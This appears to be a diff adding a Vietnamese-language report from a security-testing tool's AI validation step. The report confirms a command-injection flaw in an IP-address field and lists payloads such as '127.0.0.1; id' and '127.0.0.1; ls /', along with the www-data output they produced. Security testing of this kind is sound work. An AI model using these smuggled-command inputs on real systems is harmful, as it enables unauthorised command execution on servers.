@@ -1,0 +1,5 @@
+Command Injection — AI Self-Validation hoàn tất.
+      - Payload tốt nhất   : 127.0.0.1; id
+      - Mục đích           : semicolon injection
+      - Output trích xuất  : uid=33(www-data) gid=33(www-data) groups=33(www-data)
+      - AI Reasoning       : Các payload như '127.0.0.1; id', '127.0.0.1 && whoami', '127.0.0.1; whoami' trả về thông tin hệ thống như uid, www-data, chứng tỏ lỗ hổng thực sự tồn tại. Ngoài ra, payload '127.0.0.1; ls /' trả về danh sách file và thư mục root, cũng như '127.0.0.1; cat /proc/cpuinfo' trả về thông tin CPU, đều cho thấy hệ thống thực sự đang trả về thông tin nhạy cảm.
